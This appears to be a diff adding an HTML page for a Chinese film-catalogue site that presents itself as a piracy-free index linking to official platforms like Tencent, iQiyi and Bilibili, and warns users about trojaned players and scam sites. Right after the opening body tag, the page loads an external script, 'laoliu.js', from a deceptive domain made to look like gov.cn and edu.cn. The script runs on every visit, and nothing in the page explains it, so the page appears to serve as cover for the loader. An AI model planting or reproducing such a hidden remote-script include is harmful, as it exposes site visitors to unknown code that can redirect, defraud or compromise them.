@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视大全在线观看 - 正版影视索引目录、档期排片与盗版避坑</title>
+<meta name="description" content="影视大全在线观看做正版影视索引目录：按喜剧、动作、爱情、悬疑、科幻、亲子、历史、经典等分类索引正版电影片单，档期排片，检索评分，1905/腾讯/爱奇艺/优酷/B站/央视频等正版平台跳转，专用播放器与网盘解压盗版避坑，移动端自适应。">
+<meta name="keywords" content="影视大全在线观看,正版影视索引,片单目录,档期排片,盗版影视避坑,不装专用播放器,不聚网盘">
+<meta name="author" content="影视大全在线观看">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://yingshidaquanzaixianguankan-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f4f6f8;color:#1f2933;line-height:1.78}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+:root{
+  --blue:#1f4e79;
+  --blue2:#2f6ba3;
+  --blue3:#5b9bd5;
+  --paper:#f4f6f8;
+  --paper2:#e8edf2;
+  --green:#2e7d5b;
+  --green2:#3fa57a;
+  --amber:#e0a020;
+  --white:#fff;
+  --muted:#7a8894;
+  --dark:#1f2933;
+}
+
+/* 导航：目录册 */
+.nav{position:sticky;top:0;z-index:99;background:var(--blue);border-bottom:4px solid var(--green)}
+.nav__box{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.72rem 1rem;flex-wrap:wrap;gap:.4rem}
+.nav__logo{font-weight:900;font-size:1.3rem;color:var(--white);letter-spacing:.5px}
+.nav__logo b{color:var(--amber)}
+.nav__mark{margin-left:.5rem;font-size:.66rem;color:var(--blue);background:var(--amber);padding:.12rem .55rem;border-radius:999px;font-weight:800}
+.nav__links{display:flex;gap:.35rem;flex-wrap:wrap}
+.nav__links a{padding:.36rem .85rem;font-size:.82rem;color:var(--white);background:var(--blue2);border:1px solid var(--blue3);border-radius:6px}
+.nav__links a:hover{background:var(--amber);color:var(--blue);border-color:var(--amber)}
+
+/* Hero：目录册 */
+.hero{max-width:1200px;margin:2rem auto;padding:0 1rem}
+.hero__card{display:grid;grid-template-columns:1fr 270px;background:var(--white);border:3px solid var(--blue);border-radius:8px;overflow:hidden;box-shadow:6px 6px 0 var(--green)}
+.hero__spine{background:var(--blue);color:var(--white);padding:1.5rem 1.2rem;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:.6rem}
+.hero__spine .vol{font-size:.7rem;letter-spacing:3px;color:var(--amber)}
+.hero__spine .num{font-size:2.6rem;font-weight:900;line-height:1}
+.hero__spine .txt{font-size:.72rem;color:#cfe0ef;writing-mode:vertical-rl;letter-spacing:2px}
+.hero__main{padding:2.4rem 2.2rem}
+.hero__tag{display:inline-block;font-size:.7rem;letter-spacing:2px;color:var(--white);background:var(--green);padding:.22rem .8rem;border-radius:4px;margin-bottom:1rem;font-weight:800}
+.hero h1{font-size:clamp(1.8rem,4.5vw,2.8rem);line-height:1.2;margin-bottom:.8rem;color:var(--blue)}
+.hero h1 em{font-style:normal;color:var(--green)}
+.hero p{color:var(--muted);max-width:560px;margin-bottom:1.2rem;font-size:.9rem}
+.hero__btn{display:inline-block;background:var(--blue);color:var(--white);font-weight:900;padding:.72rem 1.9rem;border-radius:6px}
+.hero__rule{height:2px;background:repeating-linear-gradient(90deg,var(--blue),var(--blue) 8px,transparent 8px 16px);margin:1.4rem 0}
+
+/* 快捷标签 */
+.quick{max-width:1200px;margin:1.4rem auto 0;padding:0 1rem}
+.quick__box{display:flex;flex-wrap:wrap;gap:.55rem}
+.qbtn{background:var(--white);border:2px solid var(--blue3);color:var(--blue);padding:.36rem .85rem;font-size:.8rem;font-weight:700;border-radius:6px}
+.qbtn b{color:var(--green)}
+
+.wrap{max-width:1200px;margin:3.6rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem;position:relative}
+.head::after{content:"";position:absolute;bottom:-6px;left:0;width:70px;height:3px;background:var(--green);border-radius:2px}
+.head h2{font-size:1.55rem;color:var(--blue)}
+.head h2 span{color:var(--green)}
+.head a{margin-left:auto;color:var(--muted);font-size:.84rem}
+
+/* 栏目1：索引卡 */
+.index{display:grid;grid-template-columns:repeat(4,1fr);gap:1.2rem}
+.card{background:var(--white);border:2px solid var(--paper2);border-radius:8px;padding:1.1rem;transition:.3s;position:relative}
+.card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--blue)}
+.card:hover{transform:translateY(-5px);border-color:var(--green);box-shadow:0 12px 26px rgba(46,125,91,.15)}
+.card__no{font-size:.68rem;color:var(--green);font-weight:800;letter-spacing:1px}
+.card__emo{font-size:1.8rem;margin:.3rem 0}
+.card h3{font-size:.92rem;color:var(--dark);margin-bottom:.3rem;font-weight:900}
+.card p{font-size:.76rem;color:var(--muted);min-height:44px}
+.bar{height:6px;background:var(--paper2);border-radius:3px;overflow:hidden;margin-top:.6rem}
+.bar span{display:block;height:100%;background:linear-gradient(90deg,var(--blue),var(--green))}
+.card__plat{display:inline-block;margin-top:.5rem;font-size:.68rem;color:var(--white);background:var(--blue);padding:.15rem .5rem;border-radius:4px}
+
+/* 栏目2：档期时间轴 */
+.timeline{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.axis{background:var(--white);border:2px solid var(--paper2);border-radius:8px;padding:1.3rem;position:relative}
+.axis__title{display:flex;align-items:center;gap:.6rem;color:var(--blue);margin-bottom:.9rem;font-size:1.02rem}
+.axis__title .dot{width:14px;height:14px;background:var(--green);border-radius:50%;flex-shrink:0}
+.tick{display:flex;gap:.8rem;padding:.55rem 0;border-bottom:1px dashed var(--paper2);font-size:.86rem}
+.tick:last-child{border:0}
+.tick__time{flex:0 0 58px;color:var(--green);font-weight:900;font-size:.72rem;background:var(--paper2);padding:.18rem .2rem;border-radius:4px;text-align:center}
+.tick__film{color:var(--dark)}
+.tick__plat{margin-left:auto;color:var(--muted);font-size:.72rem}
+
+/* 栏目3：检索评分 */
+.ranks{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem}
+.rank{background:var(--white);border:2px solid var(--paper2);border-radius:8px;padding:1.2rem;text-align:center}
+.rank__top{display:flex;align-items:center;justify-content:space-between;margin-bottom:.6rem}
+.rank__top span{font-size:.66rem;color:var(--blue);font-weight:800;background:var(--paper2);padding:.1rem .5rem;border-radius:4px}
+.rank__num{font-size:1.6rem;font-weight:900;color:var(--green)}
+.rank__num small{font-size:.65rem;color:var(--muted)}
+.rank h4{font-size:.86rem;color:var(--dark);margin-bottom:.3rem}
+.rank p{font-size:.72rem;color:var(--muted)}
+
+/* 栏目4：正版平台 */
+.rail{display:flex;flex-wrap:wrap;gap:.8rem}
+.chip{padding:.72rem 1.05rem;border-radius:6px;background:var(--white);border:2px solid var(--blue3);color:var(--blue);font-weight:800;min-width:148px}
+.chip small{display:block;font-weight:400;color:var(--muted);font-size:.72rem}
+
+/* 栏目5：避坑 */
+.warn{background:var(--paper2);border-left:6px solid var(--green);border-radius:6px;padding:1.5rem 1.6rem}
+.warn h3{color:var(--green);margin-bottom:.7rem;font-size:1.05rem}
+.warn-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem}
+.warn ul{margin-left:1.2rem;color:var(--muted);font-size:.86rem}
+.warn li{margin:.3rem 0}
+.warn b{color:var(--dark)}
+
+.foot{margin-top:4rem;background:var(--blue);color:#cfe0ef;text-align:center;padding:2.5rem 1rem;border-top:4px solid var(--amber)}
+.foot b{color:var(--amber)}
+.foot a{color:var(--blue3);margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#9db4c6}
+
+@media(max-width:980px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__spine{flex-direction:row;padding:.8rem 1.2rem}
+  .hero__spine .txt{writing-mode:horizontal-tb}
+  .index,.ranks{grid-template-columns:repeat(2,1fr)}
+  .timeline{grid-template-columns:1fr}
+  .warn-grid{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.25rem}
+  .index,.ranks{grid-template-columns:1fr}
+  .tick__plat{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">影视大全<span class="nav__mark">正版索引</span></div>
+    <nav class="nav__links">
+      <a href="#index">分类索引</a>
+      <a href="#timeline">档期排片</a>
+      <a href="#ranks">检索评分</a>
+      <a href="#legal">正版平台</a>
+      <a href="#check">避坑指南</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__spine">
+      <div class="vol">VOL.</div>
+      <div class="num">01</div>
+      <div class="txt">正版影视索引目录</div>
+    </div>
+    <div class="hero__main">
+      <span class="hero__tag">CATALOGUE / 只做索引，不做播放</span>
+      <h1>影视大全<br><em>在线观看？只跳正版官方</em></h1>
+      <p>搜"影视大全在线观看"出来的同名野站，常做免费全集、百度影音/专用播放器、网盘解压码、博彩跳转，甚至混成人擦边。这个站不接那套：<b>纯索引、纯导航、不播片、不嵌播放器、不聚网盘</b>，只在目录里按分类查正版片单，再跳官方平台。</p>
+      <a href="#index" class="hero__btn">翻目录 ›</a>
+      <div class="hero__rule"></div>
+    </div>
+  </div>
+</section>
+
+<div class="quick">
+  <div class="quick__box">
+    <div class="qbtn">😄 喜剧 → <b>下饭架</b></div>
+    <div class="qbtn">💥 动作 → <b>大片架</b></div>
+    <div class="qbtn">💘 爱情 → <b>心事架</b></div>
+    <div class="qbtn">🕵️ 悬疑 → <b>烧脑架</b></div>
+    <div class="qbtn">🚀 科幻 → <b>视效架</b></div>
+    <div class="qbtn">🧸 亲子 → <b>童话架</b></div>
+  </div>
+</div>
+
+<main>
+<section class="wrap" id="index">
+  <div class="head"><h2>分类<span>索引</span></h2><a href="#">更多 ›</a></div>
+  <div class="index">
+    <article class="card"><div class="card__no">NO.01</div><div class="card__emo">😄</div><h3>下饭轻喜剧</h3><p>都市误会、职场吐槽、合家欢轻梗，通勤下饭首选；不推枪版合集。</p><div class="bar"><span style="width:88%"></span></div><span class="card__plat">腾讯/优酷/芒果</span></article>
+    <article class="card"><div class="card__no">NO.02</div><div class="card__emo">💥</div><h3>动作大片架</h3><p>警匪、武侠、超级英雄，优先IMAX/4K；枪版掉帧不入库。</p><div class="bar"><span style="width:92%"></span></div><span class="card__plat">腾讯/优酷/Disney+</span></article>
+    <article class="card"><div class="card__no">NO.03</div><div class="card__emo">💘</div><h3>爱情心事架</h3><p>暗恋、异地、婚姻，按情绪分级；不推成人擦边、未删减支线。</p><div class="bar"><span style="width:80%"></span></div><span class="card__plat">腾讯/爱奇艺/B站</span></article>
+    <article class="card"><div class="card__no">NO.04</div><div class="card__emo">🕵️</div><h3>烧脑悬疑架</h3><p>本格推理、社会派、时间线嵌套，重闭环；错轴机翻不入选。</p><div class="bar"><span style="width:86%"></span></div><span class="card__plat">爱奇艺/腾讯</span></article>
+    <article class="card"><div class="card__no">NO.05</div><div class="card__emo">🚀</div><h3>科幻视效架</h3><p>太空、AI、末日、赛博，正版视效优先；盗录虚标不入。</p><div class="bar"><span style="width:94%"></span></div><span class="card__plat">腾讯/优酷/Disney+</span></article>
+    <article class="card"><div class="card__no">NO.06</div><div class="card__emo">🧸</div><h3>亲子童话架</h3><p>动画、自然、国学启蒙，按年龄分级；不走"全年龄免费"野站。</p><div class="bar"><span style="width:90%"></span></div><span class="card__plat">央视频/B站/少儿</span></article>
+    <article class="card"><div class="card__no">NO.07</div><div class="card__emo">📜</div><h3>历史正剧架</h3><p>朝代、传记、重大事件，看史料出处与服化道；戏说当正史不入选。</p><div class="bar"><span style="width:87%"></span></div><span class="card__plat">1905/央视频/腾讯</span></article>
+    <article class="card"><div class="card__no">NO.08</div><div class="card__emo">🏆</div><h3>经典修复架</h3><p>金鸡、三大节、奥斯卡入选，按修复版/正版字幕挑，不囤"无删减合集"。</p><div class="bar"><span style="width:96%"></span></div><span class="card__plat">1905/MUBI/B站</span></article>
+  </div>
+</section>
+
+<section class="wrap" id="timeline">
+  <div class="head"><h2>档期<span>排片表</span></h2><a href="#">更多 ›</a></div>
+  <div class="timeline">
+    <div class="axis">
+      <div class="axis__title"><span class="dot"></span>白天档 · 轻索引</div>
+      <div class="tick"><span class="tick__time">09:00</span><span class="tick__film">亲子动画/自然启蒙</span><span class="tick__plat">央视频·B站</span></div>
+      <div class="tick"><span class="tick__time">11:00</span><span class="tick__film">下饭喜剧/合家欢</span><span class="tick__plat">优酷·芒果·腾讯</span></div>
+      <div class="tick"><span class="tick__time">14:00</span><span class="tick__film">青春爱情/轻甜</span><span class="tick__plat">腾讯·B站·1905</span></div>
+      <div class="tick"><span class="tick__time">16:30</span><span class="tick__film">历史正剧/老片修复</span><span class="tick__plat">1905·央视频</span></div>
+    </div>
+    <div class="axis">
+      <div class="axis__title"><span class="dot"></span>夜间档 · 深索引</div>
+      <div class="tick"><span class="tick__time">19:00</span><span class="tick__film">悬疑/社会剧情</span><span class="tick__plat">爱奇艺·腾讯</span></div>
+      <div class="tick"><span class="tick__time">20:30</span><span class="tick__film">动作大片/科幻</span><span class="tick__plat">腾讯·优酷·Disney+</span></div>
+      <div class="tick"><span class="tick__time">22:00</span><span class="tick__film">慢片/治愈/散文</span><span class="tick__plat">西瓜·B站·1905</span></div>
+      <div class="tick"><span class="tick__time">23:30</span><span class="tick__film">获奖精选/导演剪辑</span><span class="tick__plat">MUBI·1905·Prime</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="ranks">
+  <div class="head"><h2>检索<span>评分</span></h2><a href="#">更多 ›</a></div>
+  <div class="ranks">
+    <div class="rank"><div class="rank__top"><span>正版可信</span></div><div class="rank__num">8.8<small>/10</small></div><h4>官方来源覆盖</h4><p>正版平台覆盖、画质修复等级、字幕音轨完整。</p></div>
+    <div class="rank"><div class="rank__top"><span>剧情好看</span></div><div class="rank__num">7.9<small>/10</small></div><h4>剧本与人物</h4><p>结构完整、人物立体，经得起反复回看。</p></div>
+    <div class="rank"><div class="rank__top"><span>来源干净</span></div><div class="rank__num">9.4<small>/10</small></div><h4>版权可追溯</h4><p>备案主体、版权方、正版平台交叉核对。</p></div>
+    <div class="rank"><div class="rank__top"><span>安全无坑</span></div><div class="rank__num">9.9<small>/10</small></div><h4>不播片零风险</h4><p>无播放器、无网盘解压、无博彩弹窗。</p></div>
+  </div>
+</section>
+
+<section class="wrap" id="legal">
+  <div class="head"><h2>正版<span>跳转平台</span></h2><a href="#">更多 ›</a></div>
+  <div class="rail">
+    <div class="chip">1905电影网<small>国产经典/老片/修复版</small></div>
+    <div class="chip">腾讯视频<small>院线/喜剧/悬疑/视效</small></div>
+    <div class="chip">爱奇艺<small>悬疑/文艺/社会剧情</small></div>
+    <div class="chip">优酷<small>港片/喜剧/合家欢</small></div>
+    <div class="chip">芒果TV<small>青春/轻喜剧/亲子</small></div>
+    <div class="chip">哔哩哔哩<small>动画/作者/纪录片</small></div>
+    <div class="chip">央视频<small>历史/少儿/官方纪录片</small></div>
+    <div class="chip">西瓜视频<small>治愈/下映片/免费专区</small></div>
+    <div class="chip">咪咕视频<small>国产/动画/大屏免费</small></div>
+    <div class="chip">学习强国<small>红色经典/纪录片无广告</small></div>
+    <div class="chip">MUBI<small>国际获奖/作者电影</small></div>
+    <div class="chip">Disney+<small>超级英雄/动画/科幻</small></div>
+  </div>
+</section>
+
+<section class="wrap" id="check">
+  <div class="head"><h2>避坑<span>页</span></h2><a href="#">更多 ›</a></div>
+  <div class="warn">
+    <h3>📋 目录附录 · 同名野站常见坑，本索引一律不收</h3>
+    <div class="warn-grid">
+      <ul>
+        <li>不播"院线枪版/未删减全集/永久免费" → 盗录侵权、画质残缺，索引零容忍。</li>
+        <li>不装"百度影音/专用播放器/解码器/APK/浏览器插件" → 正规平台不需额外程序，陌生包可能带木马。</li>
+        <li>不聚网盘解压码、不加群领资源 → 解压费、加群红包、二次引流都高危。</li>
+      </ul>
+      <ul>
+        <li>不填银行卡/身份证/短信验证码；假播放弹窗、博彩跳转、假客服立即关。</li>
+        <li>不挂"系统中毒/立即修复/客服微信充值/关杀软才能播" → 别点，用正规安全工具扫。</li>
+        <li>不接成人/擦边短剧当电影栏目；只走正版来源与适龄分级，同名野站≠本目录。</li>
+      </ul>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div><b>影视大全在线观看</b> · 正版影视索引目录 / 分类片单 / 档期排片 / 检索评分 / 盗版避坑</div>
+  <div style="margin-top:.6rem">
+    <a href="#index">分类索引</a>|
+    <a href="#timeline">档期排片</a>|
+    <a href="#ranks">检索评分</a>|
+    <a href="#legal">正版平台</a>|
+    <a href="#check">避坑指南</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://yingshidaquanzaixianguankan-h5.github.io</small>
+  <small>© 2025 影视大全在线观看 正版影视索引目录站；不提供盗版影片、不聚合网盘资源、不提供成人内容、不引导安装第三方播放器、不在线播片</small>
+</footer>
+
+</body>
+</html>
